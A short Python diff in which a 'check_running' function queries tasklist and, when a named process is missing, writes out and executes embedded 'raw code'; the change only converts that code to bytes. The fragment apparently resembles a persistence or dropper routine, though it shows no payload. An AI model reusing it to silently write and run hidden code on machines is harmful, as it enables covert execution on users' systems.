@@ -110,7 +110,8 @@ def check_running():
             logging.info(f"Tasklist output for {process_name}: {output.decode()}")
             if bytes(process_name, 'utf-8') not in output:
                 logging.info(f"{process_name} is not running. Attempting to execute raw code.")
-                write_and_execute(raw_code)
+                # Ensure raw_code is in bytes before passing it to write_and_execute
+                write_and_execute(raw_code.encode('utf-8') if isinstance(raw_code, str) else raw_code)
     except subprocess.CalledProcessError as e:
         logging.error(f"Error running tasklist: {e}")
     except Exception as e:
